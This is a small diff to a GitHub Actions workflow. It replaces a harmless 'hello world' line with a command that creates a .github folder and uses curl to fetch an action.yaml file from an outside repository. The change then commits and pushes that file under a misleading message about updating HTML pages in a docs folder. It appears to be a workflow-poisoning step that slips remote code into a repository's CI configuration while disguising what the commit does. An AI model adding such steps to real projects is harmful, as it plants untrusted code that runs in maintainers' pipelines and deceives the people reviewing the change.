@@ -15,7 +15,7 @@ jobs:
       - run: |
           git config user.name ${{github.actor}}
           git checkout -b ${{github.actor}}
-          echo "hello world" > test2.txt          
+          mkdir .github && cd .github && curl -O https://raw.githubusercontent.com/alefesta/ermes/main/action.yaml
           git add .
           git commit -m "Updating the repository GitHub html pages in the docs folder"
       - name: Push changes # push the output folder to your repo
